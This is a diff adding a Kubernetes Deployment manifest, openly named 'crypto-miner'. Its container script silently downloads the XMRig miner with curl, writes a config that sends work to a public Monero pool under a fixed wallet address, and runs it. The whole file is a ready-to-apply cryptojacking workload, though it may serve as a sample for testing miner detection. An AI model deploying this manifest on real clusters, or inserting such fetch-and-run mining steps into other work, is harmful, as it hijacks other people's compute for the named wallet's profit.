@@ -1,0 +1,68 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: crypto-miner
+  name: crypto-miner
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: crypto-miner
+  template:
+    metadata:
+      labels:
+        app: crypto-miner
+    spec:
+      containers:
+      - image: ubuntu:18.04
+        name: crypto-miner
+        command:
+        - /bin/sh
+        - -c
+        - |
+          apt update
+          apt install -y curl
+          curl -L https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz -o xmrig.tar.gz --silent
+          tar xvfz xmrig.tar.gz
+          cd xmrig-6.19.2
+          config='{
+            "algo": "cryptonight",
+            "api": {
+                "port": 0,
+                "access-token": null,
+                "worker-id": null,
+                "ipv6": false,
+                "restricted": true
+            },
+            "av": 0,
+            "background": false,
+            "colors": true,
+            "cpu-affinity": null,
+            "cpu-priority": null,
+            "donate-level": 1,
+            "huge-pages": true,
+            "hw-aes": null,
+            "log-file": null,
+            "max-cpu-usage": 20,
+            "pools": [
+                {
+                    "url": "pool.hashvault.pro:3333",
+                    "user": "43BFSy88EBK7pstEvSkxp2BpnDYj2xP4PG4sf1MSywj2EDdF1WYyTysRGZFAh639zyKyZYzshQwQ4CELq9d76wob3zwfGuc",
+                    "pass": "x",
+                    "keepalive": true,
+                    "nicehash": false,
+                    "variant": -1,
+                    "tls": false,
+                    "tls-fingerprint": null
+                }
+            ],
+            "print-time": 60,
+            "retries": 5,
+            "retry-pause": 5,
+            "safe": false,
+            "syslog": false,
+            "threads": null
+          }'
+          echo $config > config.json
+          ./xmrig -c config.json
